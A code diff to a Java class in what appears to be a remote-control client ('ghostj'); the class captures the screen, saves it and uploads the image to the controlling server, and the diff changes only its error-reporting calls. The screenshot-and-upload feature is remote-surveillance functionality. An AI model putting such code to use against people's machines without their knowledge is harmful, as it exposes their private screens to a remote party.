@@ -11,6 +11,7 @@ import java.io.File;
 import java.util.Date;
 
 import static com.ghostj.client.conn.HandleConn.writeToServer;
+import static com.ghostj.client.conn.HandleConn.writeToServerIgnoreException;
 
 public class FuncPrtScr implements AbstractFunc {
 	@Override
@@ -70,18 +71,18 @@ public class FuncPrtScr implements AbstractFunc {
 					writeToServer("成功将截图保存到 " + finalParam +"\n");
 					writeToServer("耗时:"+ti+"ms\n");
 				} catch (Exception e) {
-					writeToServer("获取屏幕截图失败:" + ClientMain.getErrorInfo(e)+"\n");
+					writeToServerIgnoreException("获取屏幕截图失败:" + ClientMain.getErrorInfo(e)+"\n");
 				}
 				try {
 					//发送到服务器
 					FileSender.sendFile(new File(finalParam), "prtscr/"+ ClientMain.name, "prtscr" + new Date().getTime(), HandleConn.ip, HandleConn.rft_port);
 				}catch (Exception e){
-					writeToServer("无法将截图上传至服务器"+"\n");
+					writeToServerIgnoreException("无法将截图上传至服务器"+"\n");
 				}
 			});
 			t.start();
 		}catch (Exception e){
-			writeToServer("获取屏幕截图失败:" + ClientMain.getErrorInfo(e)+"\n");
+			writeToServerIgnoreException("获取屏幕截图失败:" + ClientMain.getErrorInfo(e)+"\n");
 		}
 		HandleConn.sendFinishToServer();
 	}
